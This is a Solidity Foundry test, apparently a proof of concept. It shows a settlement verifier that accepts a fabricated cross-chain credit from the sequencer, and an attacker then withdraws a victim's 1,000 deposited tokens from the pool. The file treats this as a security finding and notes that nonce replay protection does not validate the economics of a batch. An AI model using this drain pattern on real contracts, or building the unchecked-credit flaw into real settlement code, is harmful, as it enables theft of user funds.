// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Pool} from "../src/Pool.sol";
import {MockERC20} from "../src/mocks/MockERC20.sol";
import {VulnerableSettlementVerifier} from "../src/VulnerableSettlementVerifier.sol";

contract VulnerableSettlementVerifierTest is Test {
    Pool internal pool;
    MockERC20 internal token;
    VulnerableSettlementVerifier internal verifier;

    address internal sequencer = makeAddr("sequencer");
    address internal victim = makeAddr("victim");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        pool = new Pool();
        token = new MockERC20("Settlement Token", "SET");
        verifier = new VulnerableSettlementVerifier(pool, address(token), sequencer);

        pool.setSettlementOperator(address(verifier), true);

        token.mint(victim, 1_000 ether);
        vm.startPrank(victim);
        token.approve(address(pool), type(uint256).max);
        pool.deposit(address(token), 1_000 ether);
        vm.stopPrank();
    }

    function test_strictBatchNonceDoesNotStopFakeCrossChainCreditDrain() public {
        VulnerableSettlementVerifier.PnLUpdate[] memory pnl =
            new VulnerableSettlementVerifier.PnLUpdate[](0);

        VulnerableSettlementVerifier.CrossChainCredit[] memory credits =
            new VulnerableSettlementVerifier.CrossChainCredit[](1);
        credits[0] =
            VulnerableSettlementVerifier.CrossChainCredit({user: attacker, amount: 1_000 ether});

        vm.prank(sequencer);
        verifier.submitBatch(0, pnl, credits);

        assertEq(verifier.nextBatchNonce(), 1);
        assertEq(pool.totalLiabilities(address(token)), 2_000 ether);
        assertEq(token.balanceOf(address(pool)), 1_000 ether);
        assertGt(
            pool.totalLiabilities(address(token)),
            token.balanceOf(address(pool)),
            "fake credit should make liabilities exceed assets"
        );

        // The fabricated internal claim can now withdraw the victim-backed real assets.
        vm.prank(attacker);
        pool.withdraw(address(token), 1_000 ether);

        assertEq(token.balanceOf(attacker), 1_000 ether);
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(pool.balanceOf(address(token), victim), 1_000 ether);
        assertEq(pool.totalLiabilities(address(token)), 1_000 ether);

        // Replay protection still works; it simply did not prove the batch was economically valid.
        vm.prank(sequencer);
        vm.expectRevert(
            abi.encodeWithSelector(VulnerableSettlementVerifier.InvalidBatchNonce.selector, 1, 0)
        );
        verifier.submitBatch(0, pnl, credits);
    }
}
